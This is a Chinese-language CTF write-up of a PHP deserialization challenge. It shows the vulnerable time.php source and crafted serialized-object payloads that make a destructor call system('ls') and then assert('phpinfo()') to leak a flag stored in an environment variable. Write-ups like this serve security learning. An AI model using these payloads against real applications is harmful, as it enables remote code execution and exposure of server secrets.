![](<./img/Pasted image 20221201150134.png>)

---
首页长这样

![](<./img/Pasted image 20221201150215.png>)

查看前端代码，尝试寻找注入

![](<./img/Pasted image 20221201150309.png>)

```php
/time.php?source
```

```php
<?php
#error_reporting(0);
class HelloPhp
{
    public $a;
    public $b;
    public function __construct(){
        $this->a = "Y-m-d h:i:s";
        $this->b = "date";
    }
    public function __destruct(){
        $a = $this->a;
        $b = $this->b;
        echo $b($a);
    }
}
$c = new HelloPhp;

if(isset($_GET['source']))
{
    highlight_file(__FILE__);
    die(0);
}

@$ppp = unserialize($_GET["data"]);

```

看样子是个简单的反序列化，尝试以下payload
```php
/time.php?data=O:8:"HelloPhp":2:{s:1:"a";s:2:"ls";s:1:"b";s:6:"system";}
```
![](<./img/Pasted image 20221201154452.png>)

并没有反应，看来是`system`被ban了

`eval`作为特殊形式，本身不是函数，所以不能使用

尝试用`file_get_contents`读出和构造匿名函数，结果都失败了QAQ，一是不知道`flag`在什么文件里，二是匿名函数不能序列化

看网上大佬用的`assert`才想起来还有这玩意

`flag`不知道在哪个文件里，答案是作为环境变量了，要通过`phpinfo()`获得
```php
/time.php?data=O:8:"HelloPhp":2:{s:1:"a";s:9:"phpinfo()";s:1:"b";s:6:"assert";}
```

![](<./img/Pasted image 20221201170810.png>)

这个在本地机上咋也跑不起来QAQ，然后查文档发现是本地机`php`版本太高了

![](<./img/Pasted image 20221201165741.png>)

![](<./img/Pasted image 20221201165815.png>)

#Web #PHP #反序列化 #bypass #assert #function #环境变量